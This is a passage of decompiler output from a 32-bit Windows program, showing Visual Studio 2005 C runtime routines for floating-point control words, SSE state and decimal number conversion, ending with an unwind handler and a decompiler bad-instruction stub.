    local_24._0_2_ = 0;
    param_1 = 0;
    param_2 = 0;
  }
LAB_0041b1e6:
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_24._2_2_ = (ushort)param_1;
  uVar17 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  *param_6 = local_50;
  if (((param_5 & 1) == 0) || (param_4 = param_4 + local_50, 0 < param_4)) {
    if (0x15 < param_4) {
      param_4 = 0x15;
    }
    iVar21 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 0x10) - 0x3ffe;
    local_1a = 0;
    bStack_19 = 0;
    iVar18 = 8;
    do {
      uVar25 = local_24._2_2_;
      iVar4 = CONCAT22(local_24._2_2_,(undefined2)local_24) << 1;
      local_24._0_2_ = (undefined2)iVar4;
      local_24._2_2_ = (ushort)((uint)iVar4 >> 0x10);
      iVar4 = CONCAT22(uStack_1e,uStack_20) * 2;
      uStack_20 = (ushort)iVar4 | uVar25 >> 0xf;
      iVar12 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2;
      uStack_1c = (ushort)iVar12 | uStack_1e >> 0xf;
      iVar18 = iVar18 + -1;
      uStack_1e = (ushort)((uint)iVar4 >> 0x10);
      local_1a = (undefined)((uint)iVar12 >> 0x10);
      bStack_19 = (byte)((uint)iVar12 >> 0x18);
    } while (iVar18 != 0);
    if ((iVar21 < 0) && (uVar17 = -iVar21 & 0xff, uVar17 != 0)) {
      do {
        iVar21 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
        uVar13 = CONCAT22(uStack_1e,uStack_20);
        iVar18 = CONCAT22(uStack_1e,uStack_20);
        uVar15 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 1;
        uStack_1c = (ushort)uVar15;
        local_1a = (undefined)(uVar15 >> 0x10);
        bStack_19 = bStack_19 >> 1;
        uStack_1e = uStack_1e >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
        uVar15 = CONCAT22(local_24._2_2_,(undefined2)local_24);
        local_24._2_2_ = local_24._2_2_ >> 1 | (ushort)((uint)(iVar18 << 0x1f) >> 0x10);
        uVar17 = uVar17 - 1;
        uStack_20 = (ushort)(uVar13 >> 1);
        local_24._0_2_ = (undefined2)(uVar15 >> 1);
      } while (0 < (int)uVar17);
    }
    uVar17 = CONCAT22(local_24._2_2_,(undefined2)local_24);
    psVar1 = param_6 + 2;
    psVar19 = psVar1;
    uVar25 = uStack_1e;
    for (iVar18 = param_4 + 1; 0 < iVar18; iVar18 = iVar18 + -1) {
      local_24._2_2_ = (ushort)(uVar17 >> 0x10);
      local_24._0_2_ = (undefined2)uVar17;
      iVar2 = CONCAT22(uStack_20,local_24._2_2_);
      local_38 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
      uVar15 = CONCAT22(uVar25,uStack_20) * 2;
      uVar13 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2 | (uint)(uVar25 >> 0xf)) * 2 |
               uVar15 >> 0x1f;
      uVar22 = (uVar15 | local_24._2_2_ >> 0xf) * 2 | (uVar17 << 1) >> 0x1f;
      uVar15 = uVar17 * 5;
      if ((uVar15 < uVar17 * 4) || (uVar23 = uVar22, uVar15 < uVar17)) {
        uVar23 = uVar22 + 1;
        bVar5 = false;
        if ((uVar23 < uVar22) || (uVar23 == 0)) {
          bVar5 = true;
        }
        if (bVar5) {
          uVar13 = uVar13 + 1;
        }
      }
      uVar22 = CONCAT22(uVar25,uStack_20) + uVar23;
      if ((uVar22 < uVar23) || (uVar22 < CONCAT22(uVar25,uStack_20))) {
        uVar13 = uVar13 + 1;
      }
      iVar21 = (uVar13 + local_38) * 2;
      uStack_1c = (ushort)iVar21 | (ushort)(uVar22 >> 0x1f);
      uVar17 = uVar17 * 10;
      local_1a = (undefined)((uint)iVar21 >> 0x10);
      uStack_20 = (ushort)(uVar22 * 2) | (ushort)(uVar15 >> 0x1f);
      *(char *)psVar19 = (char)((uint)iVar21 >> 0x18) + '0';
      psVar19 = (short *)((int)psVar19 + 1);
      uStack_1e = (ushort)(uVar22 * 2 >> 0x10);
      bStack_19 = 0;
      local_40 = (undefined2)local_24;
      uStack_3a = uVar25;
      uVar25 = uStack_1e;
    }
    psVar20 = psVar19 + -1;
    uStack_1e = uVar25;
    if (*(char *)((int)psVar19 + -1) < '5') {
      for (; (psVar1 <= psVar20 && (*(char *)psVar20 == '0'));
          psVar20 = (short *)((int)psVar20 + -1)) {
      }
      if (psVar20 < psVar1) {
        *param_6 = 0;
        *(undefined *)((int)param_6 + 3) = 1;
        *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
        *(char *)psVar1 = '0';
        *(undefined *)((int)param_6 + 5) = 0;
        goto LAB_0041b3a7;
      }
    }
    else {
      for (; (psVar1 <= psVar20 && (*(char *)psVar20 == '9'));
          psVar20 = (short *)((int)psVar20 + -1)) {
        *(char *)psVar20 = '0';
      }
      if (psVar20 < psVar1) {
        psVar20 = (short *)((int)psVar20 + 1);
        *param_6 = *param_6 + 1;
      }
      *(char *)psVar20 = *(char *)psVar20 + '\x01';
    }
    cVar16 = ((char)psVar20 - (char)param_6) + -3;
    *(char *)((int)param_6 + 3) = cVar16;
    *(undefined *)(cVar16 + 4 + (int)param_6) = 0;
  }
  else {
    *param_6 = 0;
    *(undefined *)((int)param_6 + 3) = 1;
    *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
  }
LAB_0041b3a7:
  local_24 = uVar17;
  local_10 = param_2;
  uStack_3e = iVar2;
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __hw_cw
// 
// Library: Visual Studio 2005 Release

uint __hw_cw(void)

{
  uint uVar1;
  uint uVar2;
  uint unaff_EBX;
  
  uVar1 = (uint)((unaff_EBX & 0x10) != 0);
  if ((unaff_EBX & 8) != 0) {
    uVar1 = uVar1 | 4;
  }
  if ((unaff_EBX & 4) != 0) {
    uVar1 = uVar1 | 8;
  }
  if ((unaff_EBX & 2) != 0) {
    uVar1 = uVar1 | 0x10;
  }
  if ((unaff_EBX & 1) != 0) {
    uVar1 = uVar1 | 0x20;
  }
  if ((unaff_EBX & 0x80000) != 0) {
    uVar1 = uVar1 | 2;
  }
  uVar2 = unaff_EBX & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x400;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x800;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0xc00;
    }
  }
  if ((unaff_EBX & 0x30000) == 0) {
    uVar1 = uVar1 | 0x300;
  }
  else if ((unaff_EBX & 0x30000) == 0x10000) {
    uVar1 = uVar1 | 0x200;
  }
  if ((unaff_EBX & 0x40000) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___hw_cw_sse2
// 
// Library: Visual Studio 2005 Release

uint __fastcall ___hw_cw_sse2(undefined4 param_1,uint param_2)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = 0;
  if ((param_2 & 0x10) != 0) {
    uVar1 = 0x80;
  }
  if ((param_2 & 8) != 0) {
    uVar1 = uVar1 | 0x200;
  }
  if ((param_2 & 4) != 0) {
    uVar1 = uVar1 | 0x400;
  }
  if ((param_2 & 2) != 0) {
    uVar1 = uVar1 | 0x800;
  }
  if ((param_2 & 1) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  if ((param_2 & 0x80000) != 0) {
    uVar1 = uVar1 | 0x100;
  }
  uVar2 = param_2 & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x2000;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x4000;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0x6000;
    }
  }
  uVar2 = param_2 & 0x3000000;
  if (uVar2 == 0x1000000) {
    uVar1 = uVar1 | 0x8040;
  }
  else {
    if (uVar2 == 0x2000000) {
      return uVar1 | 0x40;
    }
    if (uVar2 == 0x3000000) {
      return uVar1 | 0x8000;
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  __control87
// 
// Library: Visual Studio 2005 Release

uint __cdecl __control87(uint _NewValue,uint _Mask)

{
  ushort uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  ushort in_FPUControlWord;
  
  uVar5 = 0;
  if ((in_FPUControlWord & 1) != 0) {
    uVar5 = 0x10;
  }
  if ((in_FPUControlWord & 4) != 0) {
    uVar5 = uVar5 | 8;
  }
  if ((in_FPUControlWord & 8) != 0) {
    uVar5 = uVar5 | 4;
  }
  if ((in_FPUControlWord & 0x10) != 0) {
    uVar5 = uVar5 | 2;
  }
  if ((in_FPUControlWord & 0x20) != 0) {
    uVar5 = uVar5 | 1;
  }
  if ((in_FPUControlWord & 2) != 0) {
    uVar5 = uVar5 | 0x80000;
  }
  uVar1 = in_FPUControlWord & 0xc00;
  if ((in_FPUControlWord & 0xc00) != 0) {
    if (uVar1 == 0x400) {
      uVar5 = uVar5 | 0x100;
    }
    else if (uVar1 == 0x800) {
      uVar5 = uVar5 | 0x200;
    }
    else if (uVar1 == 0xc00) {
      uVar5 = uVar5 | 0x300;
    }
  }
  if ((in_FPUControlWord & 0x300) == 0) {
    uVar5 = uVar5 | 0x20000;
  }
  else if ((in_FPUControlWord & 0x300) == 0x200) {
    uVar5 = uVar5 | 0x10000;
  }
  if ((in_FPUControlWord & 0x1000) != 0) {
    uVar5 = uVar5 | 0x40000;
  }
  uVar2 = ~_Mask & uVar5 | _NewValue & _Mask;
  if (uVar2 != uVar5) {
    uVar5 = __hw_cw();
    uVar2 = 0;
    if ((uVar5 & 1) != 0) {
      uVar2 = 0x10;
    }
    if ((uVar5 & 4) != 0) {
      uVar2 = uVar2 | 8;
    }
    if ((uVar5 & 8) != 0) {
      uVar2 = uVar2 | 4;
    }
    if ((uVar5 & 0x10) != 0) {
      uVar2 = uVar2 | 2;
    }
    if ((uVar5 & 0x20) != 0) {
      uVar2 = uVar2 | 1;
    }
    if ((uVar5 & 2) != 0) {
      uVar2 = uVar2 | 0x80000;
    }
    uVar3 = uVar5 & 0xc00;
    if (uVar3 != 0) {
      if (uVar3 == 0x400) {
        uVar2 = uVar2 | 0x100;
      }
      else if (uVar3 == 0x800) {
        uVar2 = uVar2 | 0x200;
      }
      else if (uVar3 == 0xc00) {
        uVar2 = uVar2 | 0x300;
      }
    }
    if ((uVar5 & 0x300) == 0) {
      uVar2 = uVar2 | 0x20000;
    }
    else if ((uVar5 & 0x300) == 0x200) {
      uVar2 = uVar2 | 0x10000;
    }
    if ((uVar5 & 0x1000) != 0) {
      uVar2 = uVar2 | 0x40000;
    }
  }
  if (DAT_004257e4 != 0) {
    uVar5 = 0;
    if ((char)MXCSR < '\0') {
      uVar5 = 0x10;
    }
    if ((MXCSR & 0x200) != 0) {
      uVar5 = uVar5 | 8;
    }
    if ((MXCSR & 0x400) != 0) {
      uVar5 = uVar5 | 4;
    }
    if ((MXCSR & 0x800) != 0) {
      uVar5 = uVar5 | 2;
    }
    if ((MXCSR & 0x1000) != 0) {
      uVar5 = uVar5 | 1;
    }
    if ((MXCSR & 0x100) != 0) {
      uVar5 = uVar5 | 0x80000;
    }
    uVar3 = MXCSR & 0x6000;
    if (uVar3 != 0) {
      if (uVar3 == 0x2000) {
        uVar5 = uVar5 | 0x100;
      }
      else if (uVar3 == 0x4000) {
        uVar5 = uVar5 | 0x200;
      }
      else if (uVar3 == 0x6000) {
        uVar5 = uVar5 | 0x300;
      }
    }
    uVar4 = MXCSR & 0x8040;
    if (uVar4 == 0x40) {
      uVar5 = uVar5 | 0x2000000;
    }
    else if (uVar4 == 0x8000) {
      uVar5 = uVar5 | 0x3000000;
    }
    else if (uVar4 == 0x8040) {
      uVar5 = uVar5 | 0x1000000;
    }
    uVar4 = ~(_Mask & 0x308031f) & uVar5 | _Mask & 0x308031f & _NewValue;
    if (uVar4 != uVar5) {
      uVar5 = ___hw_cw_sse2(uVar3,uVar4);
      ___set_fpsr_sse2(uVar5);
      uVar5 = 0;
      if ((char)MXCSR < '\0') {
        uVar5 = 0x10;
      }
      if ((MXCSR & 0x200) != 0) {
        uVar5 = uVar5 | 8;
      }
      if ((MXCSR & 0x400) != 0) {
        uVar5 = uVar5 | 4;
      }
      if ((MXCSR & 0x800) != 0) {
        uVar5 = uVar5 | 2;
      }
      if ((MXCSR & 0x1000) != 0) {
        uVar5 = uVar5 | 1;
      }
      if ((MXCSR & 0x100) != 0) {
        uVar5 = uVar5 | 0x80000;
      }
      uVar3 = MXCSR & 0x6000;
      if (uVar3 != 0) {
        if (uVar3 == 0x2000) {
          uVar5 = uVar5 | 0x100;
        }
        else if (uVar3 == 0x4000) {
          uVar5 = uVar5 | 0x200;
        }
        else if (uVar3 == 0x6000) {
          uVar5 = uVar5 | 0x300;
        }
      }
      uVar3 = MXCSR & 0x8040;
      if (uVar3 == 0x40) {
        uVar5 = uVar5 | 0x2000000;
      }
      else if (uVar3 == 0x8000) {
        uVar5 = uVar5 | 0x3000000;
      }
      else if (uVar3 == 0x8040) {
        uVar5 = uVar5 | 0x1000000;
      }
    }
    uVar3 = uVar5 ^ uVar2;
    uVar2 = uVar5 | uVar2;
    if ((uVar3 & 0x8031f) != 0) {
      uVar2 = uVar2 | 0x80000000;
    }
  }
  return uVar2;
}



// Library Function - Single Match
//  ___mtold12
// 
// Library: Visual Studio 2005 Release

void __cdecl ___mtold12(char *param_1,int param_2,uint *param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  bool bVar4;
  bool bVar5;
  short sVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  
  uVar7 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  sVar6 = 0x404e;
  *param_3 = 0;
  param_3[1] = 0;
  param_3[2] = 0;
  if (param_2 != 0) {
    do {
      uVar2 = *param_3;
      uVar10 = *param_3;
      uVar1 = param_3[1];
      uVar11 = param_3[2];
      uVar9 = param_3[1] * 2;
      bVar4 = false;
      uVar8 = (param_3[2] * 2 | param_3[1] >> 0x1f) * 2 | uVar9 >> 0x1f;
      uVar3 = uVar2 * 4;
      uVar9 = (uVar9 | uVar2 >> 0x1f) * 2 | uVar2 * 2 >> 0x1f;
      uVar2 = uVar3 + uVar10;
      *param_3 = uVar3;
      param_3[1] = uVar9;
      param_3[2] = uVar8;
      if ((uVar2 < uVar3) || (uVar2 < uVar10)) {
        bVar4 = true;
      }
      bVar5 = false;
      *param_3 = uVar2;
      if (bVar4) {
        uVar10 = uVar9 + 1;
        if ((uVar10 < uVar9) || (uVar10 == 0)) {
          bVar5 = true;
        }
        param_3[1] = uVar10;
        if (bVar5) {
          param_3[2] = uVar8 + 1;
        }
      }
      uVar10 = param_3[1] + uVar1;
      bVar4 = false;
      if ((uVar10 < param_3[1]) || (uVar10 < uVar1)) {
        bVar4 = true;
      }
      param_3[1] = uVar10;
      if (bVar4) {
        param_3[2] = param_3[2] + 1;
      }
      param_3[2] = param_3[2] + uVar11;
      bVar4 = false;
      uVar1 = uVar2 * 2;
      uVar11 = uVar10 * 2 | uVar2 >> 0x1f;
      uVar10 = param_3[2] * 2 | uVar10 >> 0x1f;
      *param_3 = uVar1;
      param_3[1] = uVar11;
      param_3[2] = uVar10;
      uVar2 = uVar1 + (int)*param_1;
      if ((uVar2 < uVar1) || (uVar2 < (uint)(int)*param_1)) {
        bVar4 = true;
      }
      *param_3 = uVar2;
      if (bVar4) {
        uVar2 = uVar11 + 1;
        bVar4 = false;
        if ((uVar2 < uVar11) || (uVar2 == 0)) {
          bVar4 = true;
        }
        param_3[1] = uVar2;
        if (bVar4) {
          param_3[2] = uVar10 + 1;
        }
      }
      param_2 = param_2 + -1;
      param_1 = param_1 + 1;
    } while (param_2 != 0);
  }
  while (param_3[2] == 0) {
    param_3[2] = param_3[1] >> 0x10;
    sVar6 = sVar6 + -0x10;
    param_3[1] = param_3[1] << 0x10 | *param_3 >> 0x10;
    *param_3 = *param_3 << 0x10;
  }
  uVar2 = param_3[2];
  while ((uVar2 & 0x8000) == 0) {
    uVar10 = *param_3;
    uVar1 = param_3[1];
    sVar6 = sVar6 + -1;
    *param_3 = uVar10 * 2;
    uVar2 = param_3[2] * 2;
    param_3[1] = uVar1 * 2 | uVar10 >> 0x1f;
    param_3[2] = uVar2 | uVar1 >> 0x1f;
  }
  *(short *)((int)param_3 + 10) = sVar6;
  ___security_check_cookie_4(uVar7 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___set_fpsr_sse2
// 
// Library: Visual Studio 2005 Release

void __cdecl ___set_fpsr_sse2(uint param_1)

{
  if (DAT_004257e4 != 0) {
    if (((param_1 & 0x40) == 0) || (DAT_004239f4 == 0)) {
      MXCSR = param_1 & 0xffffffbf;
    }
    else {
      MXCSR = param_1;
    }
  }
  return;
}



void Unwind_0041ba60(void)

{
  int unaff_EBP;
  
  _free(*(void **)(unaff_EBP + -0x10));
  return;
}



// WARNING: Control flow encountered bad instruction data

void FUN_005228e4(void)

{
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}


